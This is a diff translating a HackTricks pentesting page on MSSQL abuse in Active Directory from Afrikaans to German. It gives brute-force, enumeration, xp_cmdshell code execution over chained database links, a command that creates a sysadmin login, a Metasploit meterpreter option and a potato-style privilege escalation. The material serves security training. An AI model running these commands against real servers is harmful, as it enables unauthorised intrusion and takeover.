@@ -1,16 +1,16 @@
-# MSSQL AD Misbruik
+# MSSQL AD Missbrauch
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -19,10 +19,10 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 {% embed url="https://websec.nl/" %}
 
-## **MSSQL Enumerasie / Ontdekking**
+## **MSSQL Aufzählung / Entdeckung**
 
 ### Python
-Die [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) hulpmiddel is gebaseer op impacket, en laat ook outentisering toe met behulp van kerberos kaartjies, en aanval deur skakelkettings.
+Das [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) Tool basiert auf impacket und ermöglicht auch die Authentifizierung mit Kerberos-Tickets und Angriffe über Linkketten.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Opname vanaf die netwerk sonder domeinsessie
+### Aufzählung aus dem Netzwerk ohne Domänensitzung
 ```
 # Interactive mode
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
@@ -87,11 +87,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
+Das Powershell-Modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ist in diesem Fall sehr nützlich.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
-### Opname vanaf die netwerk sonder domeinsessie
+### Aufzählung aus dem Netzwerk ohne Domänensitzung
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -105,7 +105,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Opname vanaf binne die domein
+### Aufzählung von innerhalb der Domäne
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -124,9 +124,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Basiese Misbruik
+## MSSQL Grundlegender Missbrauch
 
-### Toegang tot DB
+### Zugriff auf DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -140,26 +140,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer
+Es könnte auch möglich sein, **Befehle** innerhalb des MSSQL-Hosts auszuführen.
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
+Check in der im **folgenden Abschnitt genannten** Seite, wie man dies manuell macht.
 
-### MSSQL Basiese Hacking Tricks
+### MSSQL Grundlegende Hacking-Tricks
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Vertroude Skakels
+## MSSQL Vertrauenswürdige Links
 
-As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+Wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz als vertrauenswürdig (Datenbanklink) betrachtet wird. Wenn der Benutzer über Berechtigungen für die vertrauenswürdige Datenbank verfügt, kann er **die Vertrauensbeziehung nutzen, um auch in der anderen Instanz Abfragen auszuführen**. Diese Vertrauensstellungen können verkettet werden, und irgendwann könnte der Benutzer in der Lage sein, eine falsch konfigurierte Datenbank zu finden, in der er Befehle ausführen kann.
 
-**Die skakels tussen databasisse werk selfs oor woudvertroue.**
+**Die Links zwischen Datenbanken funktionieren sogar über Waldvertrauensstellungen hinweg.**
 
-### Powershell Misbruik
+### Powershell-Missbrauch
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -193,44 +193,44 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Jy kan maklik vir vertroude skakels kyk met metasploit.
+Sie können vertrauenswürdige Links ganz einfach mit Metasploit überprüfen.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misbruik maak (so, as jy nie 'n opdrag met `openquery()` kan uitvoer nie, sal jy die `EXECUTE` metode **handmatig** moet probeer om opdragte uit te voer, sien meer hieronder.)
+Beachten Sie, dass Metasploit nur die Funktion `openquery()` in MSSQL auszunutzen versucht (wenn Sie also keinen Befehl mit `openquery()` ausführen können, müssen Sie die Methode `EXECUTE` **manuell** ausprobieren, um Befehle auszuführen, siehe mehr dazu unten.)
 
-### Handmatig - Openquery()
+### Manuell - Openquery()
 
-Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
+Von **Linux** aus könnten Sie eine MSSQL-Konsole mit **sqsh** und **mssqlclient.py** erhalten.
 
-Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
+Von **Windows** aus könnten Sie auch die Links finden und Befehle manuell mit einem **MSSQL-Client wie** [**HeidiSQL**](https://www.heidisql.com) ausführen.
 
-_Registrasie met Windows-outeentifikasie:_
+_Melden Sie sich mit Windows-Authentifizierung an:_
 
 ![](<../../.gitbook/assets/image (808).png>)
 
-#### Vind Betroubare Skakels
+#### Vertrauenswürdige Links finden
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (716).png>)
 
-#### Voer navrae uit in betroubare skakel
+#### Abfragen in vertrauenswürdigem Link ausführen
 
-Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toeganklike instansie):
+Führen Sie Abfragen über den Link aus (Beispiel: Finden Sie weitere Links in der neuen zugänglichen Instanz):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Kyk waar dubbele en enkele aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
+Überprüfen Sie, wo doppelte und einfache Anführungszeichen verwendet werden, es ist wichtig, sie auf diese Weise zu verwenden.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
 
-Jy kan hierdie vertroude skakelsketting handmatig vir ewig voortset.
+Sie können diese Kette vertrauenswürdiger Links manuell endlos fortsetzen.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -238,39 +238,39 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+Wenn Sie Aktionen wie `exec xp_cmdshell` aus `openquery()` nicht ausführen können, versuchen Sie es mit der `EXECUTE`-Methode.
 
-### Handmatig - EXECUTE
+### Manuell - EXECUTE
 
-Jy kan ook vertroude skakels misbruik maak deur `EXECUTE`:
+Sie können auch vertrauenswürdige Links mit `EXECUTE` missbrauchen:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Plaaslike Privilege Escalation
+## Lokale Privilegieneskalation
 
-Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "‘n kliënt na verifikasie te verteenwoordig".
+Der **MSSQL lokale Benutzer** hat normalerweise eine spezielle Art von Privileg, das als **`SeImpersonatePrivilege`** bezeichnet wird. Dies ermöglicht dem Konto, "einen Client nach der Authentifizierung zu impersonieren".
 
-‘n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
+Eine Strategie, die viele Autoren entwickelt haben, besteht darin, einen SYSTEM-Dienst zu zwingen, sich bei einem bösartigen oder Man-in-the-Middle-Dienst zu authentifizieren, den der Angreifer erstellt. Dieser bösartige Dienst kann dann den SYSTEM-Dienst impersonieren, während er versucht, sich zu authentifizieren.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
+[SweetPotato](https://github.com/CCob/SweetPotato) hat eine Sammlung dieser verschiedenen Techniken, die über den `execute-assembly` Befehl von Beacon ausgeführt werden können.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
